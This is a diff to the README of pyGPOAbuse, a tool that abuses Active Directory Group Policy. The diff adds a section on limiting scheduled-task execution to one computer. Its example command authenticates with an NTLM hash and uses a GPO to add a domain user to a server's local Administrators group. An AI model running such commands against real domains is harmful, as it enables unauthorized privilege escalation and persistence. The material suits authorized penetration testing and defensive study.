@@ -33,6 +33,13 @@ Reverse shell example
     -user
 ``` 
 
+### Item Level Targeting
+Scheduled tasks in Group Policy support item level targeting with various filters to narrow down execution scopes. pyGPOAbuse supports filtering via NETBIOS name via the `-computername` parameter in cases where you don't want to execute commands across the entire GPO scope. 
+
+```
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -computername SERVER01 -command "net localgroup Administrators domain.local\myuser /add"
+```
+
 ### Cleanup
 Delete the scheduled task after it executed.
 
